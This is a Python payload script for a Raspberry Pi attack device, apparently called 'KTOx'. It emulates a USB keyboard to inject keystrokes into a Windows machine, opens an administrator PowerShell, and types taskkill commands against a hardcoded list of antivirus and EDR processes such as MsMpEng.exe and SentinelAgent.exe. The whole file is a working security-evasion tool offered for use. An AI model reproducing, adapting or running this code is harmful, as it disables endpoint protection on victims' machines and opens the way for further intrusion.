#!/usr/bin/env python3
"""
KTOx *payload* – **Process Killer (HID)**
============================================
This payload performs a Human Interface Device (HID) attack to inject commands
into a target Windows machine, attempting to terminate common Antivirus (AV)
and Endpoint Detection and Response (EDR) processes. It uses `taskkill`
commands via PowerShell.

Features:
- Uses `hid_helper` to simulate keyboard input.
- Injects PowerShell commands to kill a predefined list of processes.
- Displays attack status on the LCD.
- Checks if HID gadget is enabled.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- This payload is designed to be executed directly.
- KEY3: Exit Payload (if running in a loop or waiting for user input).
"""
import sys
import os
import time
import signal
import subprocess
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from hid_helper import hid_helper

PROCESSES_TO_KILL = [
    "MsMpEng.exe", "NisSrv.exe", "MsSense.exe", "avp.exe", "avguard.exe",
    "bdagent.exe", "mbam.exe", "SentinelAgent.exe", "CylanceSvc.exe"
]

PINS = { "KEY3": 16 } # Only KEY3 is used for exit
GPIO.setmode(GPIO.BCM)
GPIO.setup(PINS["KEY3"], GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def show_message(lines, color="lime"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    show_message(["HID Attack:", "Process Killer"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    kill_commands = ""
    for proc in PROCESSES_TO_KILL:
        kill_commands += f"taskkill /f /im {proc}; "
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.x)
        time.sleep(0.5)
        hid_helper.press_key(hid_helper.keyboard.a)
        time.sleep(1.5)
        hid_helper.type_string(kill_commands)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string("exit")
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        show_message(["Attack Sent!", "AV/EDR processes", "targeted."])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Process Killer payload finished.")